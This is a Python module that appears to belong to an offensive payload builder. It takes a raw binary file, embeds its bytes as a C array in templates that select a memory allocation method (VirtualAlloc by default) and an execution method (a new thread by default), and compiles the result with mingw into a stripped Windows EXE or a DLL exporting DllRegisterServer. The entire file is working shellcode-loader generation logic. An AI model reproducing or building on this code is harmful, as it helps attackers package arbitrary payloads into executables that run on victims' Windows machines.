import os
import subprocess
import sys
import uuid
from jinja2 import Environment, FileSystemLoader

def encode(input_filepath, original_filename, options):
    """
    Dynamically generates and compiles a C program based on user-selected options.
    """
    print(f"INFO: Starting Windows C embedder with options: {options}")

    with open(input_filepath, "rb") as f:
        bytecode = f.read()
    bytecode_array_str = ", ".join([f"0x{byte:02x}" for byte in bytecode])

    template_dir = os.path.join(os.path.dirname(__file__), 'templates')
    env = Environment(loader=FileSystemLoader(template_dir), trim_blocks=True, lstrip_blocks=True)
    template = env.get_template('base.c.j2')

    c_source_code = template.render(
        bytecode_array=bytecode_array_str,
        allocation_partial=f"partials/alloc_{options.get('allocation_method', 'virtualalloc')}.c.j2",
        execution_partial=f"partials/exec_{options.get('execution_method', 'newthread')}.c.j2",
        export_name=options.get('export_name', 'DllRegisterServer'),
        output_format=options.get('output_format', 'exe')
    )

    temp_c_filename = f"{uuid.uuid4()}.c"
    temp_c_filepath = os.path.join('/tmp/uploads', temp_c_filename)
    with open(temp_c_filepath, "w") as f:
        f.write(c_source_code)

    output_ext = options.get('output_format', 'exe')
    base_name, _ = os.path.splitext(original_filename)
    output_artifact_filename = f"{base_name}.{output_ext}"
    
    compiler_command = ["x86_64-w64-mingw32-gcc", "-O2"]
    if options.get('debug_mode') != 'true':
        compiler_command.append("-s")

    if options.get('debug_mode') == 'true':
        compiler_command.append("-DDEBUG")

    temp_def_filepath = None
    if output_ext == 'dll':
        compiler_command.append("-shared")
        compiler_command.append("-fvisibility=hidden")
        compiler_command.append("-lkernel32")
        
        export_name = options.get('export_name', 'DllRegisterServer')
        def_content = f"EXPORTS\n    {export_name}"
        
        temp_def_filename = f"{uuid.uuid4()}.def"
        temp_def_filepath = os.path.join('/tmp/uploads', temp_def_filename)
        with open(temp_def_filepath, "w") as f_def:
            f_def.write(def_content)
            
        compiler_command.append(temp_def_filename)

    compiler_command.extend([temp_c_filename, "-o", output_artifact_filename])

    print(f"INFO: Compiling with command: {' '.join(compiler_command)}")
    try:
        subprocess.run(compiler_command, check=True, capture_output=True, text=True, cwd='/tmp/uploads')
        print(f"INFO: Compilation successful. Artifact: {output_artifact_filename}")
    except subprocess.CalledProcessError as e:
        print(f"ERROR: Compilation failed. Stderr: {e.stderr}", file=sys.stderr)
        raise Exception(f"C compilation failed: {e.stderr}")
    finally:
        if os.path.exists(temp_c_filepath):
            os.remove(temp_c_filepath)
        if temp_def_filepath and os.path.exists(temp_def_filepath):
            os.remove(temp_def_filepath)

    return output_artifact_filename
